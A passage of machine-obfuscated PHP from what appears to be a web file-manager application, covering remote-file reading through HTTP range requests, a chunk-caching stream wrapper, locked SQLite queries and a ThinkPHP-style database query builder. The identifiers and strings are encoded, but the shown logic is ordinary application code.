$this->info($ï·£ûºŒ); return $—×»²‹š…èÊ[$_SERVER[èÍ×öˆøÉ][195]]; } public function isFile($Ô÷†) { $¬È†‹§Ï™íˆÀ = $this->info($Ô÷†); return $¬È†‹§Ï™íˆÀ[$_SERVER[èÍ×öˆøÉ][195]]; } public function isFolder($ÓÖÜ½ôªûàö) { return !1; } public function size($ŞîõÕ) { $ÈØ×Ş¥ğö€ = $this->info($ŞîõÕ); return $ÈØ×Ş¥ğö€[$_SERVER[èÍ×öˆøÉ][78]]; } public function info($ïˆï±±ìº•Ûƒ) { return $this->infoParse($ïˆï±±ìº•Ûƒ); } public function infoAuth($àî) { return $this->infoParse($àî); } public function infoWithChildren($®õ ““Éªî‹) { return $this->infoParse($®õ ““Éªî‹); } public function infoFull($òëˆ“) { return $this->infoParse($òëˆ“); } private function infoParse($òµœğÍì«) { $ØÅÇ¬İ×Î =& $_SERVER[èÍ×öˆøÉ]; $°ğ¼³“Øøçº = $this->header($òµœğÍì«); if (!$°ğ¼³“Øøçº || !$°ğ¼³“Øøçº[$ØÅÇ¬İ×Î[745]]) { return !1; } $ì„°Ÿ¦Ûè‡ = _get($°ğ¼³“Øøçº, $ØÅÇ¬İ×Î[335], 0); $Ì‡ = array($ØÅÇ¬İ×Î[28] => $°ğ¼³“Øøçº[$ØÅÇ¬İ×Î[28]], $ØÅÇ¬İ×Î[76] => $òµœğÍì«, $ØÅÇ¬İ×Î[29] => $ØÅÇ¬İ×Î[193], $ØÅÇ¬İ×Î[78] => intval($ì„°Ÿ¦Ûè‡), $ØÅÇ¬İ×Î[168] => get_path_ext($°ğ¼³“Øøçº[$ØÅÇ¬İ×Î[28]]), $ØÅÇ¬İ×Î[1306] => $ì„°Ÿ¦Ûè‡ > 0 && $°ğ¼³“Øøçº[$ØÅÇ¬İ×Î[1428]], $ØÅÇ¬İ×Î[1307] => !1); return $Ì‡; } private function header($£ô—™) { $œó­ =& $_SERVER[èÍ×öˆøÉ]; if (isset(self::$_cacheHeader[$£ô—™])) { return self::$_cacheHeader[$£ô—™]; } $ˆ•ÔÉÄœ = isset($GLOBALS[$œó­[1429]]) ? $GLOBALS[$œó­[1429]] : !1; $GLOBALS[$œó­[1429]] = !0; self::$_cacheHeader[$£ô—™] = url_header($£ô—™); $GLOBALS[$œó­[1429]] = $ˆ•ÔÉÄœ; return self::$_cacheHeader[$£ô—™]; } public function hashSimple($ıÎ“Äı••, $Ğ×‹™ğò = false) { $«‰şú =& $_SERVER[èÍ×öˆøÉ]; $×ÏîäÁşÍ‰ = $this->info($ıÎ“Äı••); if (!$×ÏîäÁşÍ‰ || !$×ÏîäÁşÍ‰[$«‰şú[195]]) { return !1; } $ÖÈé = $×ÏîäÁşÍ‰[$«‰şú[78]]; $¾™Ï£² = 200; $òµŒëì = 50; if ($ÖÈé <= $¾™Ï£² * $òµŒëì) { return md5($this->fileSubstr($ıÎ“Äı••, 0, $ÖÈé)) . $ÖÈé; } $™µáæÓé¸Ï = intval($ÖÈé / $òµŒëì); $‡Úı­‚ÕæŠ = $«‰şú[33]; $´¡‘œúÀ = timeFloat(); $à´ÄÁŒØ = 15; for ($«¦ = 0; $«¦ < $òµŒëì; $«¦++) { if (timeFloat() - $´¡‘œúÀ > $à´ÄÁŒØ) { return !1; } $«“£‡ø›™ÜÎ = $this->fileSubstr($ıÎ“Äı••, $™µáæÓé¸Ï * $«¦, $¾™Ï£²); if (!$«“£‡ø›™ÜÎ) { return !1; } $‡Úı­‚ÕæŠ .= $«“£‡ø›™ÜÎ; } $‡Úı­‚ÕæŠ .= $this->fileSubstr($ıÎ“Äı••, $ÖÈé - $¾™Ï£², $¾™Ï£²); return md5($‡Úı­‚ÕæŠ) . $ÖÈé; } public function getContent($øú) { return $this->fileSubstr($øú); } public function fileSubstr($–, $÷´¶´ª = 0, $ì = -1) { $°†³¾† =& $_SERVER[èÍ×öˆøÉ]; $“³„ÓåâÇ«² = $this->info($–); if (!$“³„ÓåâÇ«² || !$“³„ÓåâÇ«²[$°†³¾†[195]] && $“³„ÓåâÇ«²[$°†³¾†[78]] > 1024 * 1024 * 10) { return !1; } if ($ì === -1) { $ì = $“³„ÓåâÇ«²[$°†³¾†[78]]; } if ($ì == 0) { return $°†³¾†[33]; } $ÔÌÒ²û = array($°†³¾†[1430] . $÷´¶´ª . $°†³¾†[779] . ($÷´¶´ª + $ì - 1)); $×œÆ«§Ö¡ñ = url_request($–, $°†³¾†[228], !1, $ÔÌÒ²û, !1, !1, 1); return $×œÆ«§Ö¡ñ[$°†³¾†[1126]] ? $×œÆ«§Ö¡ñ[$°†³¾†[1126]] : $°†³¾†[33]; } public function download($†‡¡ù¯, $á§¥àÙìğ¬) { Downloader::start($†‡¡ù¯, $á§¥àÙìğ¬); return $á§¥àÙìğ¬; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($àˆ˜µòä¡Éƒ, $½ŒÄ = '') { $this->info = $this->info($àˆ˜µòä¡Éƒ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[èÍ×öˆøÉ][76]]; $this->pathOpen = $àˆ˜µòä¡Éƒ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$àˆ˜µòä¡Éƒ])) { self::$_chunkBuffer[$àˆ˜µòä¡Éƒ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÊîÆ¦Â—) { $Ää¨òäı‘ = $this->fileSubstr($this->pose, $ÊîÆ¦Â—); $this->pose += strlen($Ää¨òäı‘); return $Ää¨òäı‘; } public function stream_tell() { return $this->pose; } public function stream_seek($ÌÜ…Åô¤ë´«, $¾Õ±¹‚) { $½ûŠ­ =& $_SERVER[èÍ×öˆøÉ]; if ($¾Õ±¹‚ == SEEK_SET) { $this->pose = $ÌÜ…Åô¤ë´«; } else { if ($¾Õ±¹‚ == SEEK_CUR) { $this->pose += $ÌÜ…Åô¤ë´«; } else { if ($¾Õ±¹‚ == SEEK_END) { $this->pose = $this->info[$½ûŠ­[78]] + intval($ÌÜ…Åô¤ë´«); } } } if ($ÌÜ…Åô¤ë´« < 0) { $this->pose = $this->info[$½ûŠ­[78]] + $ÌÜ…Åô¤ë´«; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[èÍ×öˆøÉ][78]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ò‰•²º¾„, $ù¥Õ—ÍÚÕÃ) { $ñıëßÎ¾†¤Ê =& $_SERVER[èÍ×öˆøÉ]; $³ÅìÄàîğö = $this->info($ò‰•²º¾„); return array($ñıëßÎ¾†¤Ê[1431] => 0, $ñıëßÎ¾†¤Ê[1432] => 0, $ñıëßÎ¾†¤Ê[12] => 32768 + 511, $ñıëßÎ¾†¤Ê[1433] => 0, $ñıëßÎ¾†¤Ê[1434] => 0, $ñıëßÎ¾†¤Ê[1435] => 0, $ñıëßÎ¾†¤Ê[1436] => 0, $ñıëßÎ¾†¤Ê[78] => $³ÅìÄàîğö[$ñıëßÎ¾†¤Ê[78]], $ñıëßÎ¾†¤Ê[1437] => $³ÅìÄàîğö[$ñıëßÎ¾†¤Ê[1305]], $ñıëßÎ¾†¤Ê[1393] => $³ÅìÄàîğö[$ñıëßÎ¾†¤Ê[84]], $ñıëßÎ¾†¤Ê[1392] => $³ÅìÄàîğö[$ñıëßÎ¾†¤Ê[194]], $ñıëßÎ¾†¤Ê[1438] => 0, $ñıëßÎ¾†¤Ê[1439] => 0); } static $fileInfo = array(); public function info($õÒ¼‘ÆëÃ) { $³¨ = $_SERVER[èÍ×öˆøÉ][1440]; if (isset(self::$fileInfo[$õÒ¼‘ÆëÃ])) { return self::$fileInfo[$õÒ¼‘ÆëÃ]; } if (substr($õÒ¼‘ÆëÃ, 0, strlen($³¨)) != $³¨) { return !1; } self::$fileInfo[$õÒ¼‘ÆëÃ] = IO::info(substr($õÒ¼‘ÆëÃ, strlen($³¨))); return self::$fileInfo[$õÒ¼‘ÆëÃ]; } public static function read($éÆÑú‚, $²Ğ‘Ø, $ÀÉõæÔÊ¶) { if (!isset(self::$_fopenCache[$éÆÑú‚])) { $¤ôß = new StreamWrapperIO(); $¤ôß->stream_open($éÆÑú‚); self::$_fopenCache[$éÆÑú‚] = $¤ôß; } $¤ôß = self::$_fopenCache[$éÆÑú‚]; return $¤ôß->fileSubstr($²Ğ‘Ø, $ÀÉõæÔÊ¶); } public static function _read($ãëÕóÛïã, $È£, $€üŠŠ»°) { $²ôÉ¬í” =& $_SERVER[èÍ×öˆøÉ]; $ŒÔ¨³Ÿ° = fopen($ãëÕóÛïã, $²ôÉ¬í”[1309]); if (!$ŒÔ¨³Ÿ°) { return $²ôÉ¬í”[33]; } $ø½‚åÉ = 8192; fseek($ŒÔ¨³Ÿ°, $È£, SEEK_SET); $Ùùó§Á¨ÎÆè = $²ôÉ¬í”[33]; $é– = 0; while ($é– < $€üŠŠ»°) { $‚Ğë„©ÍÛß = min($ø½‚åÉ, $€üŠŠ»° - $é–); $Ùùó§Á¨ÎÆè .= fread($ŒÔ¨³Ÿ°, $‚Ğë„©ÍÛß); $é– += $‚Ğë„©ÍÛß; } fclose($ŒÔ¨³Ÿ°); return $Ùùó§Á¨ÎÆè; } public function fileSubstr($Éé¨, $áÛÂ) { $öê =& $_SERVER[èÍ×öˆøÉ]; $§†Çø = $this->info[$öê[78]]; $·ıµş–º˜ = $Éé¨; $ÅØ×¼³ôŸüöÍ = $áÛÂ; if ($Éé¨ < 0) { $Éé¨ = $§†Çø + $Éé¨; } if ($áÛÂ === !1) { $áÛÂ = $§†Çø - $Éé¨; } if ($Éé¨ + $áÛÂ > $§†Çø) { $áÛÂ = $§†Çø - $Éé¨; } if ($áÛÂ <= 0) { return $öê[33]; } if ($Éé¨ < 0 || $Éé¨ >= $§†Çø || $áÛÂ <= 0 || $áÛÂ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\154\x65\122\145\x61\144\x20\x65\162\162\157\x72\x21\x20\163\x74\141\162\164\x3d{$Éé¨}\x3b\154\145\156\x67\164\x68\x3d{$áÛÂ}\73\x20\x73\x69\172\145\x3d{$§†Çø}\x3b"); } $’Ğ¿Û°‘Ñü = 64 * 1024; $Ÿ› =& self::$_chunkBuffer[$this->path]; if (!$Ÿ›) { $Ÿ› = array(); } $¦µüù»éµ‘ = 0; $¸»æô€ÇÇ = 0; $Å ½ ë = $öê[33]; foreach ($Ÿ› as $¦µüù»éµ‘ => $Å ½ ë) { $¦µüù»éµ‘ = intval($¦µüù»éµ‘); $¸»æô€ÇÇ = $¦µüù»éµ‘ + strlen($Å ½ ë); if ($Éé¨ >= $¸»æô€ÇÇ) { continue; } if ($Éé¨ >= $¦µüù»éµ‘ && $Éé¨ + $áÛÂ <= $¸»æô€ÇÇ) { return substr($Å ½ ë, $Éé¨ - $¦µüù»éµ‘, $áÛÂ); } break; } if (count($Ÿ›) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($öê[1441], $öê[1442] . count($Ÿ›) . "\73\x73\x74\x61\162\x74\75{$Éé¨}\x2c\154\145\x6e\147\164\150\x3d{$áÛÂ}\73\x70\x6f\163\x65\x3a{$¦µüù»éµ‘}\x7e{$¸»æô€ÇÇ}"); throw new Exception($öê[1443]); } $Ë™äÖ¨Á£Ù = intval($Éé¨ / $’Ğ¿Û°‘Ñü) * $’Ğ¿Û°‘Ñü; $Ÿ² = ceil(($Éé¨ + $áÛÂ) / $’Ğ¿Û°‘Ñü) * $’Ğ¿Û°‘Ñü - $Ë™äÖ¨Á£Ù; $¹ò¼–äÒ¬˜› = IO::fileSubstr($this->path, $Ë™äÖ¨Á£Ù, $Ÿ²); $Ÿ›[$Ë™äÖ¨Á£Ù . $öê[33]] = $¹ò¼–äÒ¬˜›; ksort($Ÿ›); $Ú¥›–†Ë‡Ë = substr($¹ò¼–äÒ¬˜›, $Éé¨ - $Ë™äÖ¨Á£Ù, $áÛÂ); return $Ú¥›–†Ë‡Ë; } private function log($­£æ¨õ, $·‹Ç—Î‡À‡) { $í¨ŞÚó” =& $_SERVER[èÍ×öˆøÉ]; $®›ë¤©ò = timeFloat() - $this->timeStart; write_log(sprintf($í¨ŞÚó”[1444], $­£æ¨õ, $this->info[$í¨ŞÚó”[28]], $®›ë¤©ò, $·‹Ç—Î‡À‡), $í¨ŞÚó”[1116]); } } goto eˆ…î›çä; A½°‹·‹ãÎ: class DbSqlite extends DbSqliteBase { public function query($œêà›) { $‘˜ ö =& $_SERVER[èÍ×öˆøÉ]; if (!CacheLock::fileLock($‘˜ ö[9])) { return !1; } $„šÇêÕéÀ = parent::query($œêà›); CacheLock::fileUnLock($‘˜ ö[9]); return $„šÇêÕéÀ; } public function execute($™‹Òí¡Ú) { $ùÜ¨‹ =& $_SERVER[èÍ×öˆøÉ]; if (!CacheLock::fileLock($ùÜ¨‹[9])) { return !1; } $úÕºÅåÏ ÷ = parent::execute($™‹Òí¡Ú); CacheLock::fileUnLock($ùÜ¨‹[9]); return $úÕºÅåÏ ÷; } } class DbSqlite3 extends DbSqlite3Base { public function query($å’ÉÒ³Ñà•) { $ªÂàÉæ‹ =& $_SERVER[èÍ×öˆøÉ]; if (!CacheLock::fileLock($ªÂàÉæ‹[9])) { return !1; } $‹Õ = parent::query($å’ÉÒ³Ñà•); CacheLock::fileUnLock($ªÂàÉæ‹[9]); return $‹Õ; } public function execute($€òòÂ³Ò‚) { $ÀÃ—Í¡§Üû =& $_SERVER[èÍ×öˆøÉ]; if (!CacheLock::fileLock($ÀÃ—Í¡§Üû[9])) { return !1; } $Å­¶¼ÒÍƒì = parent::execute($€òòÂ³Ò‚); CacheLock::fileUnLock($ÀÃ—Í¡§Üû[9]); return $Å­¶¼ÒÍƒì; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\74\x3e", "\147\x74" => "\76", "\x65\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\x6c\164" => "\74\75", "\x6e\x6f\164\154\151\153\x65" => "\x4e\x4f\x54\40\x4c\111\x4b\x45", "\x6c\151\153\x65" => "\x4c\111\x4b\x45", "\x69\x6e" => "\x49\116", "\x6e\157\164\x69\x6e" => "\116\117\124\40\x49\x4e", "\156\157\x74\x20\151\156" => "\116\117\124\40\111\116", "\142\145\x74\167\145\145\x6e" => "\x42\105\124\127\105\x45\116", "\156\157\164\142\145\x74\x77\x65\x65\x6e" => "\x4e\117\124\40\x42\x45\124\x57\x45\x45\x4e", "\156\157\x74\40\142\145\164\x77\145\x65\x6e" => "\x4e\x4f\x54\x20\102\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\x53\105\114\105\x43\124\45\x44\x49\123\x54\111\x4e\x43\124\45\x20\45\x46\111\x45\x4c\104\45\40\106\122\x4f\115\x20\x25\124\101\102\x4c\105\x25\x25\112\117\111\116\45\x25\x57\110\x45\122\x45\45\45\107\122\117\125\x50\x25\45\x48\x41\x56\x49\x4e\107\45\45\x4f\x52\x44\105\x52\x25\45\x4c\111\x4d\x49\124\x25\x20\x25\125\x4e\111\117\x4e\x25\45\103\x4f\x4d\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $ÛÆè¿ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[èÍ×öˆøÉ][959], $ÛÆè¿); } public function factory($€¤…Åó— = '') { $â»É¤ =& $_SERVER[èÍ×öˆøÉ]; $€¤…Åó— = $this->parseConfig($€¤…Åó—); if (empty($€¤…Åó—[$â»É¤[960]])) { think_exception(think_lang($â»É¤[961])); } $this->dbType = ucwords(strtolower($€¤…Åó—[$â»É¤[960]])); $ê­± = $â»É¤[962] . $this->dbType; if (class_exists($ê­±)) { $­È· = new $ê­±($€¤…Åó—); if ($â»É¤[792] != strtolower($€¤…Åó—[$â»É¤[960]])) { $­È·->dbType = strtoupper($this->dbType); } else { $­È·->dbType = $this->_getDsnType($€¤…Åó—[$â»É¤[915]]); } } else { think_exception(think_lang($â»É¤[963]) . $â»É¤[964] . $ê­±); } return $­È·; } public function __call($İ, $ÙÍ·) { if (method_exists($this, $İ)) { return call_user_func_array(array($this, $İ), $ÙÍ·); } } protected function _getDsnType($ßõ) { $†ş¼ = explode($_SERVER[èÍ×öˆøÉ][4], $ßõ); $•ó¿êµ = strtoupper(trim($†ş¼[0])); return $•ó¿êµ; } private function parseConfig($‘¤á¾ˆ = '') { $çÅ =& $_SERVER[èÍ×öˆøÉ]; if (!empty($‘¤á¾ˆ) && is_string($‘¤á¾ˆ)) { $‘¤á¾ˆ = $this->parseDSN($‘¤á¾ˆ); } elseif (is_array($‘¤á¾ˆ)) { $‘¤á¾ˆ = array_change_key_case($‘¤á¾ˆ); $‘¤á¾ˆ = array($çÅ[960] => $‘¤á¾ˆ[$çÅ[791]], $çÅ[888] => $‘¤á¾ˆ[$çÅ[965]], $çÅ[889] => $‘¤á¾ˆ[$çÅ[966]], $çÅ[886] => $‘¤á¾ˆ[$çÅ[967]], $çÅ[887] => $‘¤á¾ˆ[$çÅ[968]], $çÅ[17] => $‘¤á¾ˆ[$çÅ[969]], $çÅ[915] => $‘¤á¾ˆ[$çÅ[793]], $çÅ[13] => isset($‘¤á¾ˆ[$çÅ[970]]) ? $‘¤á¾ˆ[$çÅ[970]] : array()); } elseif (empty($‘¤á¾ˆ)) { if (think_config($çÅ[971]) && $çÅ[792] != strtolower(think_config($çÅ[972]))) { $‘¤á¾ˆ = $this->parseDSN(think_config($çÅ[971])); } else { $‘¤á¾ˆ = array($çÅ[960] => think_config($çÅ[972]), $çÅ[888] => think_config($çÅ[973]), $çÅ[889] => think_config($çÅ[974]), $çÅ[886] => think_config($çÅ[975]), $çÅ[887] => think_config($çÅ[976]), $çÅ[17] => think_config($çÅ[244]), $çÅ[915] => think_config($çÅ[971]), $çÅ[13] => think_config($çÅ[977])); } } return $‘¤á¾ˆ; } protected function initConnect($¶‹ö÷€·ó¥´ã = true) { if (1 == think_config($_SERVER[èÍ×öˆøÉ][18])) { $this->_linkID = $this->multiConnect($¶‹ö÷€·ó¥´ã); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $òÒÓÄ« => $Õ…®¼ÊÇíÍíÑ) { $this->_linkID = $Õ…®¼ÊÇíÍíÑ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¶¦õò‡Ö = false) { $ÚŸ·á†â =& $_SERVER[èÍ×öˆøÉ]; static $¯™İ¢°» = array(); static $òĞ°ç¥ = -1; if (empty($¯™İ¢°»)) { foreach ($this->config as $êĞ½‡¦¬¿“õ => $ÁÅ½¯§Ú) { $¯™İ¢°»[$êĞ½‡¦¬¿“õ] = explode($ÚŸ·á†â[47], $ÁÅ½¯§Ú); } } if (think_config($ÚŸ·á†â[978])) { if ($¶¦õò‡Ö || think_config($ÚŸ·á†â[391]) === !0) { $’ğ = floor(mt_rand(0, think_config($ÚŸ·á†â[979]) - 1)); $òĞ°ç¥ = $’ğ; } else { if (is_numeric(think_config($ÚŸ·á†â[980]))) { $’ğ = think_config($ÚŸ·á†â[980]); } else { $’ğ = floor(mt_rand(think_config($ÚŸ·á†â[979]), count($¯™İ¢°»[$ÚŸ·á†â[886]]) - 1)); } } } else { $’ğ = floor(mt_rand(0, count($¯™İ¢°»[$ÚŸ·á†â[886]]) - 1)); $òĞ°ç¥ = $’ğ; } $’ğ = $òĞ°ç¥ !== -1 ? $òĞ°ç¥ : $’ğ; $–ñØÙ = array($ÚŸ·á†â[888] => isset($¯™İ¢°»[$ÚŸ·á†â[888]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[888]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[888]][0], $ÚŸ·á†â[889] => isset($¯™İ¢°»[$ÚŸ·á†â[889]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[889]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[889]][0], $ÚŸ·á†â[886] => isset($¯™İ¢°»[$ÚŸ·á†â[886]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[886]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[886]][0], $ÚŸ·á†â[887] => isset($¯™İ¢°»[$ÚŸ·á†â[887]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[887]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[887]][0], $ÚŸ·á†â[17] => isset($¯™İ¢°»[$ÚŸ·á†â[17]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[17]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[17]][0], $ÚŸ·á†â[915] => isset($¯™İ¢°»[$ÚŸ·á†â[915]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[915]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[915]][0], $ÚŸ·á†â[13] => isset($¯™İ¢°»[$ÚŸ·á†â[13]][$’ğ]) ? $¯™İ¢°»[$ÚŸ·á†â[13]][$’ğ] : $¯™İ¢°»[$ÚŸ·á†â[13]][0]); return $this->connect($–ñØÙ, $’ğ); } public function parseDSN($š³ä­Æã) { $êç® =& $_SERVER[èÍ×öˆøÉ]; if (empty($š³ä­Æã)) { return !1; } $íôÛè· = parse_url($š³ä­Æã); if ($íôÛè·[$êç®[174]]) { $Å = array($êç®[960] => $íôÛè·[$êç®[174]], $êç®[888] => isset($íôÛè·[$êç®[588]]) ? $íôÛè·[$êç®[588]] : $êç®[33], $êç®[889] => isset($íôÛè·[$êç®[981]]) ? $íôÛè·[$êç®[981]] : $êç®[33], $êç®[886] => isset($íôÛè·[$êç®[175]]) ? $íôÛè·[$êç®[175]] : $êç®[33], $êç®[887] => isset($íôÛè·[$êç®[176]]) ? $íôÛè·[$êç®[176]] : $êç®[33], $êç®[17] => isset($íôÛè·[$êç®[76]]) ? substr($íôÛè·[$êç®[76]], 1) : $êç®[33]); } else { preg_match($êç®[982], trim($š³ä­Æã), $À”šÔ«ãÙ); $Å = array($êç®[960] => $À”šÔ«ãÙ[1], $êç®[888] => $À”šÔ«ãÙ[2], $êç®[889] => $À”šÔ«ãÙ[3], $êç®[886] => $À”šÔ«ãÙ[4], $êç®[887] => $À”šÔ«ãÙ[5], $êç®[17] => $À”šÔ«ãÙ[6]); } $Å[$êç®[915]] = $êç®[33]; return $Å; } protected function debug() { $èÛˆ½ı =& $_SERVER[èÍ×öˆøÉ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $èÛˆ½ı[983]; if (think_config($èÛˆ½ı[984])) { think_status($èÛˆ½ı[985]); think_trace($this->queryStr . $èÛˆ½ı[986] . think_status($èÛˆ½ı[20], $èÛˆ½ı[985], 6) . $èÛˆ½ı[987], $èÛˆ½ı[33], $èÛˆ½ı[988]); } } protected function parseLock($èš = false) { $·¯«×™­Ìø =& $_SERVER[èÍ×öˆøÉ]; if (!$èš) { return $·¯«×™­Ìø[33]; } if ($·¯«×™­Ìø[917] == $this->dbType) { return $·¯«×™­Ìø[989]; } return $·¯«×™­Ìø[990]; } protected function parseSet($éÛŸ·Ìê˜Ú) { $“ˆ‘Ş¡ò =& $_SERVER[èÍ×öˆøÉ]; foreach ($éÛŸ·Ìê˜Ú as $•‰Í¢£¨ => $Çà•óçÉö) { if (is_array($Çà•óçÉö) && $“ˆ‘Ş¡ò[295] == $Çà•óçÉö[0]) { $ˆ¶ÖËÒ´ã[] = $this->parseKey($•‰Í¢£¨) . $“ˆ‘Ş¡ò[991] . $Çà•óçÉö[1]; } elseif (is_scalar($Çà•óçÉö) || is_null($Çà•óçÉö)) { $ˆ¶ÖËÒ´ã[] = $this->parseKey($•‰Í¢£¨) . $“ˆ‘Ş¡ò[991] . $this->parseValue($Çà•óçÉö); } } return $“ˆ‘Ş¡ò[992] . implode($“ˆ‘Ş¡ò[47], $ˆ¶ÖËÒ´ã); } protected function bindParam($©ƒò, $µÄß ÑÅ±) { $this->bind[$_SERVER[èÍ×öˆøÉ][4] . $©ƒò] = $µÄß ÑÅ±; } protected function parseBind($±¯‘Úß²éŸù) { $±¯‘Úß²éŸù = array_merge($this->bind, $±¯‘Úß²éŸù); $this->bind = array(); return $±¯‘Úß²éŸù; } function parseKey(&$¨ÓúÁşñê¸©, $í·ĞÀÔÉ = true) { if ($í·ĞÀÔÉ) { $¨ÓúÁşñê¸© = $this->parseKeyCheck($¨ÓúÁşñê¸©); } return $¨ÓúÁşñê¸©; } function parseKeyCheck($ƒÒˆÌº‰Ú›) { $ˆÂäÜŒ =& $_SERVER[èÍ×öˆøÉ]; $ƒÒˆÌº‰Ú› = trim($ƒÒˆÌº‰Ú›); if (!preg_match($ˆÂäÜŒ[993], $ƒÒˆÌº‰Ú›)) { think_exception($ˆÂäÜŒ[994] . $ƒÒˆÌº‰Ú›); } return $ƒÒˆÌº‰Ú›; } protected function parseValue($ñÅ´ß‡) { $üå‰Ò‡ =& $_SERVER[èÍ×öˆøÉ]; if (is_string($ñÅ´ß‡)) { $ñÅ´ß‡ = $üå‰Ò‡[956] . $this->escapeString($ñÅ´ß‡) . $üå‰Ò‡[956]; } elseif (isset($ñÅ´ß‡[0]) && is_string($ñÅ´ß‡[0]) && strtolower($ñÅ´ß‡[0]) == $üå‰Ò‡[295]) { $ñÅ´ß‡ = $this->escapeString($ñÅ´ß‡[1]); } elseif (is_array($ñÅ´ß‡)) { $ñÅ´ß‡ = array_map(array($this, $üå‰Ò‡[957]), $ñÅ´ß‡); } elseif (is_bool($ñÅ´ß‡)) { $ñÅ´ß‡ = $ñÅ´ß‡ ? $üå‰Ò‡[87] : $üå‰Ò‡[191]; } elseif (is_null($ñÅ´ß‡)) { $ñÅ´ß‡ = $üå‰Ò‡[103]; } return $ñÅ´ß‡; } protected function parseField($óšà¸£ºû) { $‘àîÔö =& $_SERVER[èÍ×öˆøÉ]; if (is_string($óšà¸£ºû) && strpos($óšà¸£ºû, $‘àîÔö[47])) { $óšà¸£ºû = explode($‘àîÔö[47], $óšà¸£ºû); } if (is_array($óšà¸£ºû)) { $†Ùáşµ”¾íùë = array(); foreach ($óšà¸£ºû as $‹ç => $œ¬Ø) { if (!is_numeric($‹ç)) { $†Ùáşµ”¾íùë[] = $this->parseKey($‹ç, !1) . $‘àîÔö[995] . $this->parseKey($œ¬Ø); } else { $†Ùáşµ”¾íùë[] = $this->parseKey($œ¬Ø); } } $öµ = implode($‘àîÔö[47], $†Ùáşµ”¾íùë); } elseif (is_string($óšà¸£ºû) && !empty($óšà¸£ºû)) { $öµ = $óšà¸£ºû; } else { $öµ = $‘àîÔö[182]; } return $öµ; } protected function parseTable($Íãš¯) { $«Ğ¯² =& $_SERVER[èÍ×öˆøÉ]; if (is_array($Íãš¯)) { $ì³ = array(); foreach ($Íãš¯ as $¯À‰İãà˜ => $à„İº—É) { if (!is_numeric($¯À‰İãà˜)) { $ì³[] = $this->parseKey($¯À‰İãà˜) . $«Ğ¯²[50] . $this->parseKey($à„İº—É); } else { $ì³[] = $this->parseKey($¯À‰İãà˜); } } $Íãš¯ = $ì³; } elseif (is_string($Íãš¯)) { if (strstr($Íãš¯, $«Ğ¯²[50])) { return $Íãš¯; } $Íãš¯ = explode($«Ğ¯²[47], $Íãš¯); array_walk($Íãš¯, array($this, $«Ğ¯²[906])); } return $«Ğ¯²[900] . trim(implode($«Ğ¯²[996], $Íãš¯), $«Ğ¯²[383]) . $«Ğ¯²[900]; } protected function parseWhere($Ç…) { $Œ‚¹¹‰¿˜É =& $_SERVER[èÍ×öˆøÉ]; $ªÈÑÓ» = $Œ‚¹¹‰¿˜É[33]; if (is_string($Ç…)) { $ªÈÑÓ» = $Ç…; } else { $¾ = isset($Ç…[$Œ‚¹¹‰¿˜É[997]]) ? strtoupper($Ç…[$Œ‚¹¹‰¿˜É[997]]) : $Œ‚¹¹‰¿˜É[33]; if (in_array($¾, array($Œ‚¹¹‰¿˜É[998], $Œ‚¹¹‰¿˜É[999], $Œ‚¹¹‰¿˜É[1000]))) { $¾ = $Œ‚¹¹‰¿˜É[50] . $¾ . $Œ‚¹¹‰¿˜É[50]; unset($Ç…[$Œ‚¹¹‰¿˜É[997]]); } else { $¾ = $Œ‚¹¹‰¿˜É[1001]; } foreach ($Ç… as $Ò€àØóÖ”ï => $‚®ªÕ…ãÖˆ) { $ªÈÑÓ» .= $Œ‚¹¹‰¿˜É[275]; if (is_numeric($Ò€àØóÖ”ï)) { $Ò€àØóÖ”ï = $Œ‚¹¹‰¿˜É[1002]; } if (0 === strpos($Ò€àØóÖ”ï, $Œ‚¹¹‰¿˜É[71])) { $ªÈÑÓ» .= $this->parseThinkWhere($Ò€àØóÖ”ï, $‚®ªÕ…ãÖˆ); } else { if (!preg_match($Œ‚¹¹‰¿˜É[1003], trim($Ò€àØóÖ”ï))) { think_exception(think_lang($Œ‚¹¹‰¿˜É[1004]) . $Œ‚¹¹‰¿˜É[4] . $Ò€àØóÖ”ï); } $¶Ä”¶”½É = is_array($‚®ªÕ…ãÖˆ) && 